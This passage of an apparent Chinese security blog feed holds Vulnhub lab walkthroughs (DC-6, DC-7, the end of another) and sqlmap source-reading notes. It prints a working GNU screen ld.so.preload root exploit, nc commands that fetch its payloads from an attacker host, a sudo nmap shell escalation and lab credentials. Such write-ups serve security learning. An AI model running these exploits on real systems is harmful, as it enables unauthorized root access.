class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
<p>使用nc将这两个文件传输到/tmp目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lnvp 4444 &lt; libhax.so</span><br><span class="line">nc -lnvp 4444 &lt; rootshell</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">nc 10.1.1.139 4444 &gt; libhax.so</span><br><span class="line">nc 10.1.1.139 4444 &gt; rootshell</span><br></pre></td></tr></table></figure>
<p>安装步骤输入指令获得root权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172526.png">  </p>
<p> 最后在/root查看flag<br> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172553.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>靶机</tag>
        <tag>文件包含</tag>
        <tag>screen提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6靶机</title>
    <url>/2022/01/23/DC-6%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-6靶机"><a href="#DC-6靶机" class="headerlink" title="DC-6靶机"></a>DC-6靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-6,315/">下载地址</a><br>目标:获得root权限并拿到flag<br>特点:<br>sudo 反弹其他用户shell</p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123114122.png">  </p>
<p>尝试访问80端口，但是显示无法访问，安照提示在host中加入<code>192.168.0.142 wordy</code>即可成功访问。<br>访问80端口后发现是一个wordpress博客 ，用户为<code>wordy</code>  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123114521.png">  </p>
<p>进入管理员登录页面尝试爆破存在的帐号。<br>帐号存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">sarah</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123121726.png">  </p>
<p>接着使用BurpSuite开始进行密码爆破。我使用的字典都没有跑出结果，这时候想到在下载页面作者提示。<br><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-) 跑到kali下面把passwords.txt文件弄出来继续跑密码爆破。 爆破结果</code>mark:helpdesk01`可以登录<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123122904.png">  </p>
<p>登录后发现存在Activity Montitor 插件   </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123154416.png">  </p>
<p>搜索发现存在漏洞<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123154514.png">  </p>
<p>查看相关信息可以发现，找到在wordpress中的对应位置。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123155145.png">  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123155158.png">  </p>
<p>抓包后数据进行反弹shell<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123155415.png"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123155430.png">  </p>
<p>在/home/mark/stuff中发现<code>graha</code>帐号密码<br><code>graham - GSo7isUM1D4</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123160002.png">  </p>
<p>登录后发现 /home/jens中存在一个备份的backup.sh文件，jens用户和devs组都具有完全的权限。<br>同时我们使用<code>sudo -l</code> 发现graham可以执行该文件，且graham属于devs用户组，可以修改backup.sh文件。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162244.png">  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162256.png">  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162311.png">  </p>
<p>我们往文件中写入反弹shell。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162352.png">  </p>
<p>用sudo 执行获得反弹jens的shell。 </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162806.png">  </p>
<p>查看后发现，jens可以用root运行namp  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123162928.png"></p>
<p>使用sudo提权，获得root权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $SHELL</span><br><span class="line">sudo nmap --script=$SHELL</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123164217.png">  </p>
<p>查看flag<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220123164242.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>Vulhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7靶机</title>
    <url>/2022/01/24/DC-7%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-7靶机"><a href="#DC-7靶机" class="headerlink" title="DC-7靶机"></a>DC-7靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-7,356/">下载地址</a><br>目标:获得root权限并拿到flag<br>提示:暴破和目录扫描没有，想办法<code>&quot;outside&quot; of the box</code><br>特点: Drush修改密码 , Linux计划任务,github查看信息</p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124095830.png">  </p>
<p>80端口上是一个Drupal博客  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124095956.png">  </p>
<p>进行目录扫描，在<code>/core/install.php</code>页面发现版本为8.7.6  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124100650.png">  </p>
<p>搜索漏洞库，并没有发现有用的漏洞。目录扫描也没有什么有效的信息。去网上看了一下教材，发现是搜索博客中下方的版权信息<code>@DC7USER</code>.<br> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124102633.png">  </p>
<p> 搜索之后可以发现dc7user有一个github，里面存在一个项目stuffdb，在其中的config.php中含有数据库连接帐号密码。<code>dc7user:MdR3xOgB7#dW</code>。 </p>
<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124102759.png">  </p>
<p> 尝试使用该帐号登录Drupal但是无果。换个思路去试一试ssh，成功登录。  </p>
<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124102911.png">  </p>
<p> 在dc7user的home中存在mbox，于是去<code>/var/mail</code>中看看有没有邮件信息。发现存在一个邮件信息说数据库存在<code>/home/dc7user/backups/website.sql</code>中。 </p>
<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124103244.png">  </p>
<p> 同时存在一个脚本在<code>/opt/scripts/backups.sh</code>  </p>
<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124104126.png">  </p>
<p> 查看该脚本内容<br> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124104209.png">  </p>
<p> 查看脚本我们可以发现，脚本的创建者为root，用户组为www-data。他们有完全的权限。同时该脚本会计划任务中以root权限运行。可以想到需要从网站获得SHELL，然后修改脚本获得ROOT权限。</p>
<p>在脚本内容中dursh这条指令，并不是很熟悉。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124123243.png">  </p>
<p>上网查询后发现，这条指令可以修改用户密码。尝试修改admin密码<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124123342.png">  </p>
<p>登录网站后需要安装php模块反弹shell  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124123656.png">  </p>
<p>在<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a> 网站下载php模块后选择安装</p>
<p>安装之后允许php模块运行  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124123820.png"></p>
<p>在Content页面修改基本页面</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124124125.png">  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124124152.png">  </p>
<p>成功反弹shell后修改脚本文件  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124125155.png">  </p>
<p>等待一会，脚本反弹成功。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124130131.png">  </p>
<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220124130158.png"></p>
<p>查看了一下每15分钟执行一次计划任务</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>Vulhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap-checkwaf()函数</title>
    <url>/2022/02/20/sqlmap-checkwaf-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="sqlmap-checkwaf-函数"><a href="#sqlmap-checkwaf-函数" class="headerlink" title="sqlmap checkwaf()函数"></a>sqlmap checkwaf()函数</h1><span id="more"></span>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="判断是否跳过检测waf"><a href="#判断是否跳过检测waf" class="headerlink" title="判断是否跳过检测waf"></a>判断是否跳过检测waf</h3><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 是否存在参数跳过checkwaf()</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>((conf.string, conf.notString, conf.regexp, conf.dummy, conf.offline, conf.skipWaf)):</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="comment">#判断页面是否联通</span></span><br><span class="line"><span class="keyword">if</span> kb.originalCode == _http_client.NOT_FOUND:</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="comment"># 该位置是否已经检测存在waf</span></span><br><span class="line">_ = hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> _ <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	<span class="keyword">if</span> _:</span><br><span class="line">		warnMsg = <span class="string">&quot;previous heuristics detected that the target &quot;</span></span><br><span class="line">		warnMsg += <span class="string">&quot;is protected by some kind of WAF/IPS&quot;</span></span><br><span class="line">		logger.critical(warnMsg)</span><br><span class="line">	<span class="keyword">return</span> _</span><br><span class="line"><span class="comment"># 是否获得网站页面</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> kb.originalPage:</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>通过一系列判断，决定是否要检测waf的存在。<br>分别有:</p>
<ol>
<li>存在需要跳过waf的参数</li>
<li>网站页面为404</li>
<li>该网站已经检测过存在waf</li>
<li>网站页面为空  </li>
</ol>
<h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%d %s&quot;</span> % (randomInt(), IPS_WAF_CHECK_PAYLOAD)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> PLACE.URI <span class="keyword">in</span> conf.parameters:</span><br><span class="line">    place = PLACE.POST</span><br><span class="line">    value = <span class="string">&quot;%s=%s&quot;</span> % (randomStr(), agent.addPayloadDelimiters(payload))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    place = PLACE.GET</span><br><span class="line">    value = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> conf.parameters.get(PLACE.GET) <span class="keyword">else</span> conf.parameters[PLACE.GET] + DEFAULT_GET_POST_DELIMITER</span><br><span class="line">    value += <span class="string">&quot;%s=%s&quot;</span> % (randomStr(), agent.addPayloadDelimiters(payload))</span><br><span class="line"></span><br><span class="line">pushValue(kb.choices.redirect)</span><br><span class="line">pushValue(kb.resendPostOnRedirect)</span><br><span class="line">pushValue(conf.timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kb.choices.redirect = REDIRECTION.YES</span><br><span class="line">kb.resendPostOnRedirect = <span class="literal">False</span></span><br><span class="line">conf.timeout = IPS_WAF_CHECK_TIMEOUT</span><br></pre></td></tr></table></figure>

<p>将payload和对应value的值设置</p>
<h3 id="判断当前页面重复度与初始页面重复度是否小于0-5"><a href="#判断当前页面重复度与初始页面重复度是否小于0-5" class="headerlink" title="判断当前页面重复度与初始页面重复度是否小于0.5"></a>判断当前页面重复度与初始页面重复度是否小于0.5</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">retVal = (Request.queryPage(place=place, value=value, getRatioValue=<span class="literal">True</span>, noteResponseTime=<span class="literal">False</span>, silent=<span class="literal">True</span>, raise404=<span class="literal">False</span>, disableTampering=<span class="literal">True</span>)[<span class="number">1</span>] <span class="keyword">or</span> <span class="number">0</span>) &lt; IPS_WAF_CHECK_RATIO</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要思想参考<a href="http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse%E3%80%82">http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse。</a><br>发送一系列脏字符，然后判断是否存在页面的不同。<br>主要的函数querypage()以后有时间再读…..</p>
]]></content>
      <categories>
        <category>sqlmap源码阅读</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap start()函数源码简单阅读</title>
    <url>/2022/02/13/sqlmap-start()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="sqlmap-start-函数"><a href="#sqlmap-start-函数" class="headerlink" title="sqlmap start()函数"></a>sqlmap start()函数</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/hongfei/p/sqlmap-start.html">https://www.cnblogs.com/hongfei/p/sqlmap-start.html</a></p>
<span id="more"></span>

<h2 id="初始参数设置及目标的设置"><a href="#初始参数设置及目标的设置" class="headerlink" title="初始参数设置及目标的设置"></a>初始参数设置及目标的设置</h2><h3 id="hash破解-选项"><a href="#hash破解-选项" class="headerlink" title="hash破解(选项)"></a>hash破解(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.hashFile:</span><br><span class="line">    crackHashFile(conf.hashFile)</span><br></pre></td></tr></table></figure>
<p>conf.hashFile是命令行参数 <code>--crack</code>指定的。<br>是一个独立的实验中参数，未在用户手册中出现。<br>大概猜测是破解用户hash </p>
<h3 id="直接连接数据库-选项"><a href="#直接连接数据库-选项" class="headerlink" title="直接连接数据库(选项)"></a>直接连接数据库(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.direct:</span><br><span class="line">    initTargetEnv()</span><br><span class="line">    setupTargetEnv()</span><br><span class="line">    action()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>conf.direct通过命令行参数<code>-d</code>指定。<br>通过参数<code>-d</code>指定直杰连接的数据库<br><code>eg: -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot;</code>  </p>
<h3 id="添加目标参数到kb-targets"><a href="#添加目标参数到kb-targets" class="headerlink" title="添加目标参数到kb.targets"></a>添加目标参数到kb.targets</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.url <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">any</span>((conf.forms, conf.crawlDepth)):</span><br><span class="line">	kb.targets.add((conf.url, conf.method, conf.data, conf.cookie, <span class="literal">None</span>))</span><br></pre></td></tr></table></figure>
<p>如果不需要进行爬虫，则将目标url及对应参数直接加入kb.targets</p>
<p>conf.foms 通过参数<code>--forms</code>指定。<br>设置该参数会爬取该页面的所有表单，进行sql注入测试</p>
<p>conf.crawlDepth通过参数<code>--crawl=CRAWLDEPTH</code>设置<br>该参数会设置通过目标url进行爬虫的深度</p>
<h3 id="判断configFile是否设置正确"><a href="#判断configFile是否设置正确" class="headerlink" title="判断configFile是否设置正确"></a>判断configFile是否设置正确</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.configFile <span class="keyword">and</span> <span class="keyword">not</span> kb.targets:</span><br><span class="line">	errMsg = <span class="string">&quot;you did not edit the configuration file properly, set &quot;</span></span><br><span class="line">	errMsg += <span class="string">&quot;the target URL, list of targets or google dork&quot;</span></span><br><span class="line">	logger.error(errMsg)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>如果自己设置安装config文件如<code>sqlmap.conf</code>进行配置，但是不存在kb.targes。报错参数设置错误</p>
<p>conf.configFile通过参数 <code>-c</code>设置，如果在命令行中同样提供参数，命令行参数会覆盖configFile中参数。</p>
<h3 id="判断存在几个目标"><a href="#判断存在几个目标" class="headerlink" title="判断存在几个目标"></a>判断存在几个目标</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> kb.targets <span class="keyword">and</span> isListLike(kb.targets) <span class="keyword">and</span> <span class="built_in">len</span>(kb.targets) &gt; <span class="number">1</span>:</span><br><span class="line">    infoMsg = <span class="string">&quot;found a total of %d targets&quot;</span> % <span class="built_in">len</span>(kb.targets)</span><br><span class="line">    logger.info(infoMsg)</span><br></pre></td></tr></table></figure>

<p>如果目标存在多个，在logger.info中记录</p>
<h3 id="设置初始HTTP-Headers信息"><a href="#设置初始HTTP-Headers信息" class="headerlink" title="设置初始HTTP-Headers信息"></a>设置初始HTTP-Headers信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">targetCount = <span class="number">0</span></span><br><span class="line">initialHeaders = <span class="built_in">list</span>(conf.httpHeaders)</span><br></pre></td></tr></table></figure>
<p>设置目标数量为0，同时将conf.httpHeaders设置给初始Header。<br>默认会带有sql-map标志    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Aget: sqlmap/1.6.1.7#dev (https://sqlmap.org)</span><br></pre></td></tr></table></figure>

<h2 id="主要运行程序，对所有kb-targets进行sql注入判断"><a href="#主要运行程序，对所有kb-targets进行sql注入判断" class="headerlink" title="主要运行程序，对所有kb.targets进行sql注入判断"></a>主要运行程序，对所有kb.targets进行sql注入判断</h2><h3 id="目标数量加1"><a href="#目标数量加1" class="headerlink" title="目标数量加1"></a>目标数量加1</h3><p><code>targetCount+=1</code></p>
<h3 id="判断当前网络联通性-选项"><a href="#判断当前网络联通性-选项" class="headerlink" title="判断当前网络联通性(选项)"></a>判断当前网络联通性(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.checkInternet</span><br><span class="line">*****</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>
<p>conf.checkInternet参数通过<code>--check-internet</code>设置<br>该参数会在对目标url测试前，判断基本网络联通性。<br>目标为”<a href="http://ipinfo.io/json&quot;">http://ipinfo.io/json&quot;</a></p>
<h3 id="设置conf信息为当前循环kb-targets信息"><a href="#设置conf信息为当前循环kb-targets信息" class="headerlink" title="设置conf信息为当前循环kb.targets信息"></a>设置conf信息为当前循环kb.targets信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conf.url = targetUrl</span><br><span class="line">conf.method = targetMethod.upper().strip() <span class="keyword">if</span> targetMethod <span class="keyword">else</span> targetMethod</span><br><span class="line">conf.data = targetData</span><br><span class="line">conf.cookie = targetCookie</span><br><span class="line">conf.httpHeaders = <span class="built_in">list</span>(initialHeaders)</span><br><span class="line">conf.httpHeaders.extend(targetHeaders <span class="keyword">or</span> [])</span><br></pre></td></tr></table></figure>
<p>设置conf信息为当前循环的url信息，注意初始Headers信息会加入conf，当前循环的Headers信息会添加在<code>initialHeaders</code>后，而不是覆盖。因此默认情况下sql-map的标志信息还是会存在。</p>
<h3 id="设置重复UA-选项"><a href="#设置重复UA-选项" class="headerlink" title="设置重复UA(选项)"></a>设置重复UA(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.randomAgent <span class="keyword">or</span> conf.mobile:</span><br><span class="line">	<span class="keyword">for</span> header, value <span class="keyword">in</span> initialHeaders:</span><br><span class="line">		<span class="keyword">if</span> header.upper() == HTTP_HEADER.USER_AGENT.upper():</span><br><span class="line">			conf.httpHeaders.append((header, value))</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>设置重复UA当存在conf.randomAgent或者conf.mobile</p>
<h3 id="编码post数据"><a href="#编码post数据" class="headerlink" title="编码post数据"></a>编码post数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.data:</span><br><span class="line">	<span class="comment"># Note: explicitly URL encode __ ASP(.NET) parameters (e.g. to avoid problems with Base64 encoded &#x27;+&#x27; character) - standard procedure in web browsers</span></span><br><span class="line">	conf.data = re.sub(<span class="string">r&quot;\b(__\w+)=([^&amp;]+)&quot;</span>, <span class="keyword">lambda</span> match: <span class="string">&quot;%s=%s&quot;</span> % (match.group(<span class="number">1</span>), urlencode(match.group(<span class="number">2</span>), safe=<span class="string">&#x27;%&#x27;</span>)), conf.data)</span><br></pre></td></tr></table></figure>
<p>编码post数据</p>
<h3 id="初始化目标环境"><a href="#初始化目标环境" class="headerlink" title="初始化目标环境"></a>初始化目标环境</h3><p><code>initTargetEnv()</code></p>
<h3 id="解析目标url"><a href="#解析目标url" class="headerlink" title="解析目标url"></a>解析目标url</h3><p><code>parseTargetUrl()</code> </p>
<h3 id="判断目标是否已经检测过"><a href="#判断目标是否已经检测过" class="headerlink" title="判断目标是否已经检测过"></a>判断目标是否已经检测过</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> PLACE.GET <span class="keyword">in</span> conf.parameters <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">any</span>((conf.data, conf.testParameter)):</span><br><span class="line">	<span class="keyword">for</span> parameter <span class="keyword">in</span> re.findall(<span class="string">r&quot;([^=]+)=([^%s]+%s?|\Z)&quot;</span> % (re.escape(conf.paramDel <span class="keyword">or</span> <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER, re.escape(conf.paramDel <span class="keyword">or</span> <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER), conf.parameters[PLACE.GET]):</span><br><span class="line">		paramKey = (conf.hostname, conf.path, PLACE.GET, parameter[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">if</span> paramKey <span class="keyword">not</span> <span class="keyword">in</span> kb.testedParams:</span><br><span class="line">			testSqlInj = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	paramKey = (conf.hostname, conf.path, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">	<span class="keyword">if</span> paramKey <span class="keyword">not</span> <span class="keyword">in</span> kb.testedParams:</span><br><span class="line">		testSqlInj = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>测试过的url参数信息会保存到kb.testedParams中，所以在进行test之前，会先判断当前的url是否已经test过。<br>取出主机名， 路径名 ， ‘GET’, GET参数，与<code>kb.testedParams</code>比较。判断是否检测过，如果检测过，<code>testSqlInj</code>保持默认值<code>false</code>。在下一个判断如果<code>testSqlInj=false</code>会continue，到下一个url。</p>
<h3 id="判断是否进行本次注入检测"><a href="#判断是否进行本次注入检测" class="headerlink" title="判断是否进行本次注入检测"></a>判断是否进行本次注入检测</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> testSqlInj:</span><br><span class="line">	infoMsg = <span class="string">&quot;skipping &#x27;%s&#x27;&quot;</span> % targetUrl</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line">	<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>如果<code>testSqlInj=false</code>跳过本次注入检测。</p>
<h3 id="如果存在多个目标"><a href="#如果存在多个目标" class="headerlink" title="如果存在多个目标"></a>如果存在多个目标</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.multipleTargets:</span><br><span class="line">	<span class="keyword">if</span> conf.forms <span class="keyword">and</span> conf.method:</span><br><span class="line">		message = <span class="string">&quot;[%d/%s] Form:\n%s %s&quot;</span> % (targetCount, <span class="built_in">len</span>(kb.targets) <span class="keyword">if</span> isListLike(kb.targets) <span class="keyword">else</span> <span class="string">&#x27;?&#x27;</span>, conf.method, targetUrl)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		message = <span class="string">&quot;[%d/%s] URL:\n%s %s&quot;</span> % (targetCount, <span class="built_in">len</span>(kb.targets) <span class="keyword">if</span> isListLike(kb.targets) <span class="keyword">else</span> <span class="string">&#x27;?&#x27;</span>, HTTPMETHOD.GET, targetUrl)</span><br><span class="line">*******</span><br></pre></td></tr></table></figure>

<p>如果判断存在多个目标进行额外操作。</p>
<h3 id="setupTargetEnv"><a href="#setupTargetEnv" class="headerlink" title="setupTargetEnv()"></a>setupTargetEnv()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setupTargetEnv</span>():</span></span><br><span class="line">    _createTargetDirs()</span><br><span class="line">    _setRequestParams()</span><br><span class="line">    _setHashDB()</span><br><span class="line">    _resumeHashDBValues()</span><br><span class="line">    _setResultsFile()</span><br><span class="line">    _setAuthCred()</span><br><span class="line">    _setAuxOptions()</span><br></pre></td></tr></table></figure>
<p>主要为创建结果文件，检测GET , POST 参数结果保存在<code>conf.paramDict</code>中，进行查询的中断恢复。 </p>
<p>_createTargetDirs()会创建输出目录<br>_setRequestParams()检测并设置参数，同时如果存在POST数据，检测POST数据。结果保存在<code>conf.paramDict</code>中<br>_setHashDB()设置HashDb SQLite 文件，为了恢复查询。<br>_resumeHashDBValues()从HashDB中恢复文件<br>_setResultsFile()在<code>conf.multipleTargets</code>条件下创建输出结果文件<br>_setAuthCred()为当前的连接目标设置认证信息<br>_setAuxOptions()设置辅助 选项</p>
